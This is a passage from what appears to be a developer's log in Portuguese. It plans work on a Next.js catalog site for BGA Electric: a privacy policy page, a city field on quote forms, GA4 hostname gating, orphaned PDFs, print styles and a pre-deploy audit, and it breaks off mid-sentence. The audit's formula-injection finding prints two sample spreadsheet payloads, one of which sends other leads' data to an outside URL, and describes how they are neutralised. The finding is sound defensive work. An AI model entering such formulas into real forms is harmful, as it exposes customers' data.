Criar a página de política de privacidade — hoje não existe, e é o item que
bloqueia a publicação.

1. app/politica-de-privacidad/page.jsx — página nova, estática, sem 'use client'
   Estrutura visual igual à de app/materiales-y-tratamientos/page.jsx:
   container max-w-[1180px] mx-auto px-6 py-8, breadcrumb "Inicio › Política de
   Privacidad", h1 em font-brand text-3xl font-bold text-brand-primary, e o corpo
   em max-w-3xl (texto legal em coluna estreita, como o resto do conteúdo longo).
   Cada seção: h2 em font-brand text-base font-bold text-brand-primary mb-3,
   parágrafos em text-sm text-text-secondary leading-relaxed.
   Sem FAQ schema, sem JSON-LD, sem CTA de cotización, sem WhatsApp.

   generateMetadata: title "Política de Privacidad | BGA Electric",
   description "Qué datos recoge el sitio de BGA Electric, para qué se usan, con
   quién se comparten y cómo pedir acceso, corrección o eliminación.",
   alternates.canonical '/politica-de-privacidad/', e robots noindex NÃO — a
   página é indexável, é normal que seja.

   Os dados de contato e dirección saem de client.config.js (config.contact.email,
   config.contact.phone, config.brand.address), não hardcoded.

   TEXTO (é o conteúdo da página, em espanhol, na íntegra):

   ---
   Política de Privacidad

   Última actualización: 31 de agosto de 2026

   1. Quién es responsable de tus datos
   BGA Electric S.A. — RUC [CONFIRMAR CON EL CLIENTE] —, con domicilio en Minga
   Guazú, Ruta PY02 km 14, Alto Paraná, Paraguay. Para cualquier tema de datos
   personales: ventas@bga.com.py o WhatsApp +595 974 733 100.

   2. Qué datos recogemos y cuándo
   Este sitio no pide registro ni crea cuentas de usuario. Recogemos datos en tres
   momentos:

   Cuando pedís una cotización: lo que escribís en el formulario — nombre o
   empresa, RUC y rubro — junto con la lista de productos, las cantidades y las
   observaciones que hayas cargado.

   Cuando seguís por WhatsApp: al abrirse la conversación vemos tu número de
   teléfono y el nombre de tu perfil, como en cualquier mensaje de WhatsApp.

   Mientras navegás: datos de uso del sitio a través de Google Analytics —
   páginas vistas, tipo de dispositivo, ciudad aproximada y desde dónde llegaste.
   Google procesa tu dirección IP para eso; nosotros no la vemos junto a tu
   nombre.

   La lista de productos que vas armando se guarda en tu propio navegador y no
   sale de tu equipo hasta que apretás enviar. Si limpiás los datos del navegador,
   se borra.

   3. Para qué los usamos
   Para preparar y responder tu cotización, y para contactarte por ese pedido.
   También para entender qué productos se consultan más y mejorar el catálogo. No
   vendemos ni cedemos tus datos, y no usamos este formulario para enviarte
   publicidad masiva.

   4. Con quién se comparten
   Solo con los proveedores que hacen funcionar el sitio: Google — Sheets, donde
   queda registrado el pedido en una cuenta de BGA, y Analytics, para la
   medición —, Meta (WhatsApp) si elegís seguir la conversación por ahí, y Amazon
   Web Services, donde está alojado el sitio. Cada uno trata los datos según sus
   propias políticas.

   5. Cuánto tiempo los guardamos
   Los pedidos de cotización quedan registrados mientras dure la relación
   comercial y por [CONFIRMAR: 5 años] más, por razones contables y de historial
   de obra. Podés pedirnos que los borremos antes.

   6. Tus derechos
   Podés pedirnos acceder a tus datos, corregirlos, eliminarlos, oponerte a su uso
   o pedir una copia. Escribí a ventas@bga.com.py con el asunto "Datos
   personales". Respondemos dentro de los 30 días.

   7. Cookies y medición
   Usamos Google Analytics 4, que instala cookies para contar visitas y entender
   el recorrido por el catálogo. No usamos cookies de publicidad ni de
   remarketing. Podés bloquearlas desde la configuración de tu navegador o con el
   complemento de inhabilitación de Google Analytics: el catálogo sigue
   funcionando igual.

   8. Seguridad
   El sitio se sirve por conexión cifrada (HTTPS). El registro de cotizaciones
   está en una cuenta de Google de BGA, con acceso limitado al equipo comercial.

   9. Menores de edad
   Este es un sitio de venta entre empresas. No está dirigido a menores de edad ni
   recogemos sus datos de forma intencional.

   10. Cambios en esta política
   Si cambiamos algo, actualizamos la fecha del encabezado.

   Esta política sigue los principios de la Ley N° 7593/2025 de Protección de
   Datos Personales del Paraguay.
   ---

2. app/cotacao/page.jsx — aviso no ponto da coleta
   Logo abaixo do botão "Enviar cotización por WhatsApp", uma linha:

   <p className="text-[11px] text-text-muted leading-relaxed mt-2">
     Al enviar, BGA recibe estos datos para preparar tu cotización.{' '}
     <Link href="/politica-de-privacidad/" className="underline hover:text-brand-primary">
       Política de privacidad
     </Link>
   </p>

   Não é checkbox e não bloqueia o envio: pedir cotização é relação
   pré-contratual, o que a lei pede é informar, não pedir permissão. Um checkbox
   aqui só adicionaria atrito num formulário que já é curto de propósito.
   Importar Link de next/link se ainda não estiver importado.

3. components/LandingPage.jsx — link no rodapé
   No .footerBottom, ao lado do "© 2026 BGA Electric · Todos los derechos
   reservados", um <Link href="/politica-de-privacidad/"> com o texto "Política de
   privacidad", no mesmo estilo dos outros links do rodapé.

Não mexer no formulário, no payload de registrarCotizacion nem nos eventos GA4.
Rode `npm run build` no final.
```

**Como conferir:** `/politica-de-privacidad/` abre, tem os dois `[CONFIRMAR]`
visíveis (é para eles chamarem atenção antes de publicar), e o link aparece no
rodapé da home e embaixo do botão da cotização. O build tem que gerar a rota
nova no `out/`.

**Commit:** `feat: política de privacidad y aviso en el punto de recolección`

### O que só o Akira responde

Quatro coisas. As duas primeiras seguram a publicação; as outras duas mudam o
texto se ele responder diferente:

1. **RUC da BGA Electric S.A.** e razão social exata como está no registro.
2. **Prazo de guarda** dos pedidos. A proposta é 5 anos; se ele já tem uma regra
   contábil, vale a dele.
3. **Quem mais acessa a planilha.** O texto diz "acceso limitado al equipo
   comercial". Se a funcionária que mexe na planilha do catálogo também vê os
   leads, continua verdadeiro; se acessar mais gente, o texto muda.
4. **Uso futuro dos leads.** A política diz que este formulário não vira lista de
   publicidade. Se ele pretende mandar novidades ou campanha para quem cotou, é
   melhor decidir agora — muda a frase, e depois é caro corrigir.

---

## 27. Falta a cidade no formulário de cotização (31/08, da entrevista com a Aida)

A Aida é explícita sobre o que precisa de um cliente novo: *"la ubicación, si es
de Asunción, si es de Ciudad del Este, porque eso nos ayuda a definir el plazo y
también los envíos, hay zonas que cubrimos y hay zonas que no cubrimos. Eso sería
esencial."*

O formulário pede nombre/empresa, RUC e rubro. Nome e telefone chegam de graça
pelo WhatsApp; **a cidade não chega de lugar nenhum** — e é o dado que define
prazo e frete, que são, pela boca dela, os dois fatores que derrubam a venda.

Campo livre, não select: a lista de cidades do Paraguai que importam pra BGA não
está levantada, e um select errado é pior que um input.

### Prompt pro Claude Code

```
Adicionar o campo de cidade no formulário de cotização. É o dado que a vendedora
usa para definir prazo de entrega e frete, e hoje não é coletado em lugar nenhum.

1. app/cotacao/page.jsx — estado do form
   Adicionar `ciudad: ''` ao useState do form, junto de nombre/empresa/rubro.

2. Campo na UI, depois do RUC e antes do Rubro, no mesmo array de campos:
   { label: 'Ciudad', name: 'ciudad', placeholder: 'Asunción · Ciudad del Este · …' }
   Mesmo estilo dos outros dois (não é mono).

3. buildMessage() — a linha entra logo depois de Cliente/Empresa e antes de Rubro:
   if (form.ciudad) lines.push(`Ciudad: ${form.ciudad}`)

4. registrarCotizacion() — incluir `ciudad: form.ciudad` no payload, entre
   `empresa` e `rubro`.

Nenhum campo vira obrigatório: o formulário é curto de propósito e um campo
requerido a mais custa mais do que um dado a menos. Não mexer nos eventos GA4.
Rode `npm run build` no final.
```

**Como conferir:** preencher só a cidade e enviar — a linha `Ciudad:` tem que
aparecer no preview da mensagem e na aba Cotizaciones. Deixar em branco não pode
produzir linha vazia.

**Atenção pra planilha:** o Apps Script grava as colunas que recebe. Conferir na
aba *Cotizaciones* se a coluna nova aparece; se o script tiver cabeçalho fixo,
tem que ser ajustado lá também — isso não é código deste repo.

**Commit:** `feat: ciudad en el formulario de cotización`

### Parte 2 — o formulário da home e o Apps Script (31/08)

O item acima cobriu só o formulário do catálogo. **O da home coleta lead igual** —
foi de lá que vieram os dois ou três contatos que a Aida citou na entrevista — e
também não pergunta a cidade. Os dois caminhos gravam na mesma planilha, em abas
diferentes: `doGet` da LP na primeira aba, `doPost` do catálogo na aba
*Cotizaciones*.

**A armadilha, e ela é séria.** O `bga-leads-apps-script.gs` escreve o cabeçalho
**uma vez só**, quando a aba está vazia (`getLastRow() === 0`). Numa planilha que
já tem linhas, mudar o código não mexe no cabeçalho: o `appendRow` passa a
escrever um valor a mais numa coluna sem título — e, se a coluna nova entrar no
meio, **todas as linhas novas ficam desalinhadas em relação às antigas**. Fecha em
silêncio, como todo o resto desse caminho (`no-cors` não reporta erro).

Duas saídas. Como a planilha hoje tem quase nada — o catálogo nunca esteve no ar e
a aba *Cotizaciones* só tem linhas de teste —, **migrar é mais barato que
remendar**: inserir a coluna na posição certa na mão, nas duas abas, e só então
publicar a versão nova do script. Se a planilha já tivesse histórico, a coluna
teria que ir no fim, feia mas segura.

### Prompt pro Claude Code — parte 2

```
A cidade também tem que existir no formulário da home e no Apps Script. O .gs
está versionado em docs/bga-leads-apps-script.gs — atualizar o arquivo do repo,
não só cuspir o código no chat.

1. components/LandingPage.jsx — campo no formulário
   Um input de texto "Ciudad", depois do campo de empresa e antes do Rubro, no
   mesmo padrão dos outros (.formField, label + input), com
   placeholder "Asunción · Ciudad del Este · …".
   NÃO marcar como required: os outros quatro já são, e um quinto obrigatório
   num formulário que se vende como "4 datos, 30 segundos" cobra caro.
   Ajustar esse subtítulo se o campo entrar — hoje diz "4 datos".

2. components/LandingPage.jsx — handleContactSubmit
   Ler `const ciudad = form.ciudad.value.trim()`, incluir em `params` (vai como
   query string pro doGet), e acrescentar na mensagem do WhatsApp uma linha
   `Ciudad: ${ciudad}` logo depois de `Sector:`, só quando preenchida.

3. docs/bga-leads-apps-script.gs — as duas entradas
   doGet (aba da LP):
   - ler `var ciudad = clampField(e.parameter.ciudad, LIMITS.empresa);`
   - NÃO entrar na guarda de bad_request: o campo é opcional, e o script rejeitar
     o que o formulário aceita seria falha silenciosa
   - cabeçalho passa a ['Fecha','Nombre','Empresa','Ciudad','Rubro','Mensaje'] e o
     setFontWeight/getRange de 5 colunas vira 6
   - appendRow na mesma ordem do cabeçalho

   doPost (aba Cotizaciones):
   - `HEADERS_COTIZACIONES` ganha 'Ciudad' entre 'RUC / Empresa' e 'Rubro'
   - o appendRow ganha `clampField(data.ciudad, LIMITS.empresa)` na mesma posição
   - **a coluna Estado deixa de ser a 11ª e passa a ser a 12ª** — corrigir o
     `sheet.getRange(2, 11, 2000, 1).setDataValidation(regra)` para 12, senão a
     lista suspensa vai parar na coluna errada
   - conferir os `setColumnWidth(5, 320)` e `setColumnWidth(7, 200)`, que apontam
     para Ítems e SKUs por índice e também andam uma casa

   - subir a versão no comentário do topo (v2 → v3, com a data) e dizer numa
     linha o que mudou

4. Não mexer em lib/leads.js: ele repassa o payload inteiro, então basta o
   `ciudad` estar no objeto que app/cotacao/page.jsx monta (parte 1).

Rode `npm run build` no final.
```

**A parte que não é código, e sem ela nada disso grava:**

1. Abrir a planilha e **inserir a coluna na mão** nas duas abas, na mesma posição
   do código: `Ciudad` depois de `Empresa` na primeira aba, e depois de
   `RUC / Empresa` na *Cotizaciones*. Fazer isso **antes** de publicar o script.
2. Colar o `.gs` novo no editor do Apps Script e **Implantar → Gerenciar
   implantações → Editar → Nova versão → Implantar**. Salvar sem nova versão não
   muda nada do que está no ar — é o erro clássico.
3. Enviar um lead de cada caminho e **olhar a planilha**. O `no-cors` não reporta
   erro: "abriu o WhatsApp" não prova que gravou.

**Commit:** `feat: ciudad también en el formulario de la home y en el Apps Script`



---

## 28. O espessor #12 está na ficha e falta no texto (31/08)

A Aida lista os espessores duas vezes na entrevista, e as duas vezes são cinco:
*"tenemos 22, 20, 18, 16, 14, son los espesores de chapa."* O
`globalSpecs.thicknesses` tem seis — inclui o **#12 (2,5 mm)**, que aparece como
chip clicável nas 36 fichas.

**O #12 é legítimo: foi o Akira quem pediu para incluir.** Então a inconsistência
existe, mas o conserto é o contrário do que parecia: o texto é que está
desatualizado, não o dado.

O único lugar em prosa que lista espessores é o `materialsPage.longDescription`,
e ele para no #14. Quem lê a página de materiales conta cinco; quem abre uma
ficha vê seis.

**Respondido pelo Akira (01/09): é venda normal, e com volume alto agora.** Ou
seja, o #12 é um espessor como os outros — nada de marca no chip nem de ressalva
no texto. A Aida ter citado só cinco na entrevista provavelmente reflete o mix de
antes; se o #12 cresceu há pouco, vale ela saber que ele está no configurador.

### Prompt pro Claude Code

```
lib/catalog.json — materialsPage.longDescription, o parágrafo que começa em
"Espesores de chapa:".

Hoje lista cinco e o configurador oferece seis. O #12 (2,5 mm) é vendido
— confirmado com o cliente —, então entra no texto, na frente, mantendo a ordem
decrescente de espessura:

  "Espesores de chapa: #12 (2,5 mm), #14 (2,0 mm), #16 (1,5 mm), #18 (1,2 mm),
  #20 (0,9 mm) y #22 (0,7 mm), con tolerancia de ±0,05 mm."

O resto do parágrafo — a regra de espessor mínimo por ancho — não muda: ela
começa no #14 porque #14 é o mínimo para ancho ≥500, e o #12 é mais grosso que o
mínimo, não conflita.

Não mexer em globalSpecs.thicknesses nem no padrão do configurador.
Rode `npm run build` no final.
```

**Como conferir:** contar os espessores na página de materiales e nos chips de
uma ficha — os dois têm que dar seis.

**Commit:** `content: espesor #12 en el texto de materiales`

---

## 29. O pedido literal da Aida ficou de fora da LP (31/08)

Da entrevista, sobre a landing page:

> *"Sería bueno que al lado de ese [formulário onde deixam os dados] esté el
> catálogo, y tipo que diga: verificar acá las piezas que necesita y las opciones
> que están para producir. Porque hay veces que ellos tampoco miran."*

Hoje o único link para o catálogo na LP está no rodapé. Quem chega na seção de
cotização — que é o fundo da página, onde a intenção é máxima — não tem como
descobrir que existe um catálogo navegável do lado.

Isso não é enfeite: ela recebe listas incompletas e perde tempo arrancando
espessor e estilo. O catálogo é a ferramenta que faz a lista chegar completa, e
ela está pedindo para ele aparecer exatamente onde a pessoa vai escrever a lista.

### Prompt pro Claude Code

```
components/LandingPage.jsx — na seção #contacto, dentro do .ctaLeft, depois do
último .ctaInfoBlock ("Atendemos"), um bloco de link para o catálogo:

  <Link href="/catalogo" className={styles.ctaCatalogLink}>
    <strong>¿No sabés qué pedir?</strong>
    <span>Mirá el catálogo, armá tu lista con medida, material y espesor, y
    mandala en un mensaje. Así la cotización sale más rápido.</span>
  </Link>

E o estilo em app/landing.module.css, seguindo o padrão visual dos
.ctaInfoBlock que já existem ali (mesmo espaçamento e alinhamento), com
tratamento de link: cursor pointer, o <strong> na cor de destaque da seção, e
hover que adensa a mesma matiz — não troca de cor.

`Link` de next/link já está importado no arquivo.

Não mexer no formulário nem no fluxo do WhatsApp.
Rode `npm run build` no final.
```

**Como conferir:** rolar até a seção de cotização na home e ver o link antes do
formulário, não depois. No mobile, ele tem que aparecer acima do formulário, que
é a ordem natural do `.ctaGrid` empilhado — conferir.

**Commit:** `feat: enlace al catálogo junto al formulario de cotización`

---

## 30. Duas frases da LP prometem o que o resto do site não sustenta (31/08)

**A primeira briga com a política de privacidade (item 26).** Embaixo do
formulário: *"Tu información no queda en bases de terceros."* Os dados vão para
uma planilha do Google e a navegação é medida pelo GA4 — os dois são terceiros. A
intenção da frase é "não vendemos sua lista", e isso é verdade; a redação é que
está errada. No dia em que a política subir, uma contradiz a outra na mesma
página, e é exatamente isso que faz política de privacidade não valer nada.

**A segunda é uma promessa que outra pessoa tem que cumprir.** No bloco
"Tiempo de respuesta": *"Hábil en menos de 1 hora."* A Aida cumpre a saudação
imediata — *"normalmente suelo saludarle a todos al instante"* —, mas a cotação
em si depende do tamanho da lista: *"si es muy largo... a veces tarda mucho uno o
dos presupuestos"*, e às vezes a resposta sai no dia seguinte. Prometer uma hora
para a resposta e entregar uma saudação em uma hora é o tipo de coisa que queima
confiança na primeira vez.

Não é para apagar a promessa — velocidade é diferencial real dela. É para
prometer o que ela de fato entrega.

### Prompt pro Claude Code

```
Duas frases da landing page em components/LandingPage.jsx.

1. A nota embaixo do formulário (.formNote), hoje:
   "Al enviar, abrimos WhatsApp con tu mensaje pre-formado. Tu información no
   queda en bases de terceros."

   A segunda frase é falsa a partir do item 26: los datos quedan registrados en
   una planilla de Google y la navegación se mide con GA4. Trocar por:

   "Al enviar, abrimos WhatsApp con tu mensaje pre-formado. Usamos tus datos solo
   para responderte: no los vendemos ni los cedemos para publicidad.
   [Política de privacidad]"

   com "Política de privacidad" como <Link href="/politica-de-privacidad/">,
   sublinhado, no mesmo tom de texto da nota.

2. O bloco .ctaInfoBlock de "Tiempo de respuesta", hoje "Hábil en menos de 1 hora."
   Trocar o <span> por:
   "Te saludamos en menos de 1 hora hábil. La cotización depende del largo de
   la lista."

   O <strong> "Tiempo de respuesta" não muda.

Rode `npm run build` no final.
```

**Como conferir:** abrir a home e a política lado a lado — as duas têm que contar
a mesma história sobre para onde vão os dados.

**Commit:** `content: dos promesas de la landing alineadas con la realidad`

---

## 31. O GA4 vai disparar na URL de teste (31/08)

O `Analytics.jsx` barra a medição por `NODE_ENV !== 'production'`. Isso protege o
localhost — e **não protege o staging**, porque um build do Amplify é produção.
Quando o Akira e a Aida navegarem na URL `*.amplifyapp.com`, cada clique deles
entra na propriedade do cliente.

Isso importa mais do que parece: o catálogo nunca esteve no ar, então a
propriedade está limpa. Os primeiros dias de dado são a linha de base contra a
qual todo o resto vai ser comparado, e sujá-la com uma sessão de teste é
irreversível — no GA4 não se apaga evento.

**Barrar por hostname resolve pra sempre**, inclusive para qualquer preview
futuro, e não depende de lembrar de configurar nada no console.

### Prompt pro Claude Code

```
components/Analytics.jsx — hoje só barra a medição por NODE_ENV, o que protege o
localhost mas não o staging do Amplify (build de staging é NODE_ENV=production).
Passar a injetar o GA4 apenas nos hostnames de produção.

Com export estático o HTML é gerado no build, então o hostname só existe no
navegador: a decisão tem que ser em runtime, dentro do script.

Trocar os dois <Script> por um só, que injeta o gtag apenas se o hostname estiver
na lista:

  <Script id="ga4-init" strategy="afterInteractive">
    {`(function(){
      var ok = ['bga.com.py','www.bga.com.py'];
      if (ok.indexOf(location.hostname) === -1) return;
      var s = document.createElement('script');
      s.async = true;
      s.src = 'https://www.googletagmanager.com/gtag/js?id=${id}';
      document.head.appendChild(s);
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      window.gtag = gtag;
      gtag('js', new Date());
      gtag('config', '${id}');
    })();`}
  </Script>

Manter as duas guardas que já existem (sem gaMeasurementId não injeta; fora de
produção não injeta) — a de hostname é uma terceira, não uma substituição.

Atualizar o comentário do topo do arquivo: explicar que NODE_ENV não distingue
staging de produção no Amplify, e que a lista de hostnames é o que faz isso.

A lista de hostnames precisa mudar junto se o domínio mudar — deixar isso dito no
comentário. `lib/analytics.js` não muda: track() já é no-op sem window.gtag.

Rode `npm run build` no final.
```

**Como conferir:** no `out/`, o HTML tem o script; abrindo o arquivo local ou o
staging, o `window.gtag` não existe e a aba de rede não chama o googletagmanager.
Depois de publicar no domínio, conferir em tempo real no GA4 que o evento chega.

**Commit:** `fix: GA4 solo en los hostnames de producción`

---

## 32. Os PDFs do site contradizem o próprio site (31/08)

Abrindo os arquivos de `public/docs`, a ficha técnica de bandejas (7 páginas,
julho/2026) diz, em "Materia Prima":

- **"Aluminio ASTM 1100"** — matéria-prima que o catálogo não oferece. O rastro
  disso ainda está no código: a ficha faz `.replace(' ASTM 1100','')` no nome do
  material, sobra de quando o alumínio existia.
- **nenhuma menção ao AISI 316** — que o Akira confirmou em 31/08.
- **"Chapa negra"** como matéria-prima — que ele acabou de tirar (item 25).

Ou seja: o PDF contradiz o site nas três decisões de material dos últimos dois
dias. **Por isso não entra botão de download da ficha de bandejas.** Duas
respostas contraditórias no mesmo site é a falha do item 30, agravada: PDF é o
que o cliente salva e manda pro pessoal da obra.

**Dois problemas separados, e o segundo é maior:**

**a) 8,9 MB de PDF órfão.** `ficha-tecnica-bandeja-portacables-bga.pdf` (3,2 MB) e
`catalogo-bga-bandejas-portacables-paraguay-2025-2026.pdf` (5,7 MB) não são
referenciados por página nenhuma — a ficha porque bandejas é `displayMode:
catalog` e o botão de PDF só renderiza no modo `pdf`; o catálogo geral porque a
seção de cards de PDF da home virou o `ProductFinder`. Export estático serve tudo
que está em `public/`: sem link nenhum, os dois seguem acessíveis por URL direta
e indexáveis. Documento desatualizado no ar que ninguém sabe que está no ar.

**b) Os quatro PDFs que ESTÃO linkados também dizem "Aluminio ASTM 1100".**
Escaleras, perfilados, gabinetes e tableros — conferido nos quatro arquivos. E
eles são a única coisa que essas famílias têm no site. Publicar hoje é entregar,
em quatro páginas do catálogo, um documento que diz que a BGA fabrica em
alumínio. Isso não se resolve em código.

### Prompt pro Claude Code — só a parte (a)

```
Tirar do build os dois PDFs que nenhuma página referencia e que estão
desatualizados (dizem "Aluminio ASTM 1100" e "chapa negra", que saíram do
catálogo):

  public/docs/ficha-tecnica-bandeja-portacables-bga.pdf
  public/docs/catalogo-bga-bandejas-portacables-paraguay-2025-2026.pdf

Não apagar os arquivos: mover para fora do repo, para
~/Desktop/BGA-catalogo/4. Catálogo Sitioweb/pdfs-desatualizados-2026-08/, e
remover do git com `git rm --cached` seguido do move, ou `git rm` depois de
copiar. Confirmar antes que nenhum código os referencia:

  grep -rn "ficha-tecnica-bandeja-portacables\|catalogo-bga-bandejas" app components lib client.config.js

Os quatro PDFs restantes (escaleras, perfilados, gabinetes, cajas) ficam onde
estão: são a única coisa que essas famílias têm, e a correção deles é do cliente.

Rode `npm run build` e confira que `out/docs/` tem só os quatro.
```

**Commit:** `chore: saca del build los PDF huérfanos y desactualizados`

### O que fica pro cliente

O material é do Akira e ele já decidiu tudo o que muda. A lista é curta:
**alumínio sai, AISI 316 entra, chapa negra sai.** Vale mandar junto das perguntas
da política.

**E uma decisão de go/no-go pro dia da publicação:** os quatro PDFs linkados
dizem alumínio. As opções são publicar assim e corrigir depois, tirar os links e
deixar as quatro famílias com descrição e WhatsApp, ou segurar até o Akira
atualizar. É decisão dele com informação sua — não é para resolver em silêncio.

---

## 33. Imprimir a cotização — o artefato que falta no meio do processo (31/08)

Da entrevista com a Aida, sobre o que custa tempo: *"yo suelo pasarles las
opciones, ellos vuelven a consultar con su gente de obra y después me traen la
información y vamos cargando."* Esse ida-e-volta hoje são mensagens soltas de
WhatsApp — "é tipo U ou tipo C?", "chapa 20 ou 18?" — e é o gargalo que ela
descreve duas vezes.

Falta um artefato no meio: **a lista especificada**, que o cliente leva pro
pessoal da obra e confere de uma vez. O carrinho já tem tudo o que ela precisa
ter — SKU composto, configuração, quantidade, observação — e não tem como sair da
tela.

**Não é presupuesto e não pode parecer um.** O orçamento sai do sistema dela, com
preço e com o desconto daquele cliente. O impresso do catálogo não tem preço
nenhum, de propósito, e leva "Lista de especificación" no topo justamente para
ninguém confundir.

**Por que na cotização e não na ficha:** um botão de imprimir na ficha disputa com
o "Agregar a cotización", que é o CTA que ficou sólido e sozinho de propósito.
Na cotização não disputa com nada — a pessoa acabou de montar a lista, é o
momento em que ela quer levar aquilo embora. (Foi por isso que o botão pareceu
poluído quando esteve na ficha.)

Não existe nada de impressão no projeto hoje: nem `@media print`, nem
`window.print`. É folha nova.

### Prompt pro Claude Code

```
Adicionar impressão da cotização. Sem biblioteca: window.print() mais folha de
estilo de impressão — o "Guardar como PDF" do navegador é universal e funciona
offline.

1. app/globals.css — bloco @media print no fim do arquivo
   - esconder por padrão o que não é conteúdo: header/nav, o botão do WhatsApp
     flutuante, botões de + e −, remover/lixeira, o próprio botão de imprimir,
     e o link "Ver cotización"
   - fundo branco, texto preto, sem sombra e sem borda arredondada
   - `a[href]::after { content: "" }` — não imprimir a URL depois dos links
   - evitar quebra dentro de uma linha do carrinho:
     `break-inside: avoid` na linha do item
   Usar uma classe utilitária `.no-print` para marcar o que some, em vez de
   caçar seletor por seletor.

2. app/cotacao/page.jsx
   - marcar com `no-print` os controles: botões de quantidade, remover, o botão
     de enviar por WhatsApp e o bloco de "ya tengo mi lista"
   - um cabeçalho que só aparece na impressão (`hidden print:block` ou uma
     classe `.solo-print`), com: logo da BGA, "Lista de especificación",
     a data de hoje, e os dados do formulário que estiverem preenchidos
     (nombre/empresa, RUC, ciudad, rubro)
   - uma nota no rodapé impresso: "Lista de especificación — no es un
     presupuesto. Los precios se confirman con el equipo comercial de BGA."
   - o botão, secundário, ao lado do de WhatsApp, com onClick={() => window.print()}
     e o texto "Imprimir / Guardar PDF". Estilo de ação secundária: borda, sem
     preenchimento sólido — não pode competir com o botão de enviar.

3. app/catalogo/[categoria]/[produto]/ProductSheet.jsx — sem botão
   Só marcar com `no-print` o header, o configurador e os CTAs, para que ⌘P numa
   ficha saia legível: imagem, nome, SKU, specs e descrição. Ninguém pediu botão
   aqui; a folha de estilo é para quem imprime de qualquer jeito.

Testar de verdade na prévia de impressão do navegador — quebra de página e
imagem são onde isso falha. Conferir com 1, com 12 e com 30 itens no carrinho.
Rode `npm run build` no final.
```

**Como conferir:** ⌘P na cotização com 12 itens — uma folha limpa, sem nav, sem
botões, com a lista inteira e a nota de que não é orçamento. E ⌘P numa ficha não
pode sair com o configurador no meio.

**Commit:** `feat: imprimir la lista de especificación desde la cotización`

### A pergunta que o teste com a Aida responde

Se ela mesma usar o catálogo para montar a lista candidata e mandar pro cliente,
o PDF pode não ser o formato certo: no WhatsApp, **link é um toque e PDF é um
anexo** — e com link o cliente muda a quantidade e devolve, que é exatamente o
ida-e-volta dela. Hoje isso não existe: o carrinho vive só no `localStorage` e não
há lista compartilhável (a configuração na URL do item 3 é por ficha, não por
lista).

Codificar a lista na URL é factível e não é enorme, mas é bem mais que este item.
**Não construir antes do teste.** Na sessão com ela, a tarefa não é "monte uma
cotação como se fosse cliente" e sim **"chegou essa lista incompleta no WhatsApp,
resolve"** — e no fim, mostrar as duas saídas e perguntar qual ela mandaria.

**Consequência a resolver antes de publicar:** se a Aida virar usuária do
catálogo, ela suja o GA4 com uso interno. O filtro de tráfego interno planejado é
por IP (o do Akira), e IP não pega ela no celular com dados móveis. Precisa de um
marcador melhor.

---

## 34. Auditoría pré-deploy — quatro achados (01/09)

Varredura antes de publicar, a pedido: build, bundle, pipeline de lead, links,
assets e o Apps Script. **O build passa limpo** — 55 páginas, exit 0, com o
`output: 'export'` já destravado. Quatro coisas mudaram. A primeira é falha de
segurança de verdade; a segunda ameaça a regra 3 no dia do deploy.

**Duas delas não terminam em commit** — precisam de mão humana em console de
terceiro. Estão marcadas ⚠️ abaixo e repetidas no checklist do dia.

---

### 34a. Injeção de fórmula na planilha da BGA 🔴 segurança

`clampField`, no Apps Script, aparava e truncava — e nada impedia um `=` no
começo. **O Sheets avalia como fórmula toda célula cujo texto comece com
`=`, `+`, `-` ou `@`**, e os dois formulários escrevem texto de visitante direto
no `appendRow`.

Quem preenchesse "Nombre / empresa" com

```
=HYPERLINK("https://sitio-falso.py";"Ver cotización BGA")
```

punha um link de aparência nativa na planilha que a Aida abre todo dia. Pior:
`=IMAGE("https://.../x?d="&A2)` manda as linhas vizinhas — os outros leads — pra
fora, sem clique nenhum.

**Custo de explorar: zero.** A `leadWebhookUrl` e a chave estão no bundle público
por desenho (e está certo que estejam — a decisão de 24/08 continua válida, isso
nunca foi segredo de verdade), e o `doPost` aceita qualquer JSON.

**O que mudou** — `clampField` agora prefixa apóstrofo quando o texto começa com
um desses caracteres. O apóstrofo é o marcador de texto do Sheets: não aparece na
célula. `=` no meio da frase ("Acosta = Eléctrica") não é tocado. Como os dois
caminhos passam por `clampField`, **isto conserta também o formulário da home,
que já está no ar hoje.**

Entrou junto um teto de 200 itens no `doPost`: um POST forjado com milhares de
linhas consome a cota diária do Apps Script, e cota estourada significa lead real
deixando de gravar **em silêncio** — o `no-cors` esconde a falha, que é
exatamente o ponto cego da seção 5.2.

⚠️ **Ação manual, sem a qual nada disso vale:** o arquivo do repo é cópia de
referência; o script que roda está na conta da BGA. Colar
`docs/bga-leads-apps-script.gs` (agora v4) no editor e **publicar NOVA VERSÃO** —
editar o `Code.gs` não implanta (runbook, Parte 5).

**Commit:** `fix: neutraliza inyección de fórmula en la planilla de leads`

---

### 34b. Sem `amplify.yml`, o deploy podia não ser estático 🔴 regra 3

Não havia build spec no repo. O Amplify autodetecta Next.js pelo `package.json` e
gera uma que aponta pra `.next` com o runtime SSR; este projeto usa
`output: 'export'` e escreve em `out/`. O resultado é ou deploy quebrado, ou —
pior, porque é silencioso — **um servidor 24/7 na conta AWS do cliente**, que é o
que a regra 3 e a seção 5.1b existem para impedir. Destravar o export e deixar a
hospedagem decidir sozinha teria desfeito o trabalho todo.

**O que mudou** — `amplify.yml` explícito na raiz, com `baseDirectory: out`.
Levou junto as cabeçalhos de segurança que o export estático não consegue
declarar no `next.config.mjs` (não há servidor pra emiti-las): `nosniff`,
`SAMEORIGIN`, `Referrer-Policy`, `Permissions-Policy`. Mais `Cache-Control`
imutável só pra `/_next/static`, que leva hash no nome — o HTML não foi tocado,
tem que seguir revalidando ou um deploy novo não chega em quem já visitou.

**Ficaram de fora, de propósito:** CSP (o site carrega o gtag de
googletagmanager.com — uma CSP mal calibrada mata a medição sem avisar, o mesmo
tipo de falha muda que já custou caro aqui; entra depois, testada no navegador) e
HSTS (fica cacheado longo no navegador e o domínio ainda vai trocar de app).

⚠️ **Ação manual:** ao conectar o repo, conferir no console que a app diz
plataforma **"Web"** e não **"Web Compute"**. E olhar o primeiro build: se a
imagem do Amplify subir com Node velho, o Next 14 reclama.

**Commit:** `build: amplify.yml explícito — export estático, no SSR`

---

### 34c. O catálogo inteiro viajava em toda página 🟡

`components/Header.jsx` é client e vive no layout raiz — e importava
`getCategories()` de `lib/products.js`, que faz `import data from './catalog.json'`
no topo. Medido no build: um chunk de **114 KB carregado em todas as páginas**,
home inclusive, com os 87 produtos das 6 famílias — **inclusive as 5 que nem vão
ao ar e cujos dados ainda estão incompletos.**

Isso desfazia pela porta dos fundos a invariante que o `lib/search.js` documenta
em texto ("é o que evita que o catálogo inteiro volte pro bundle do client") e
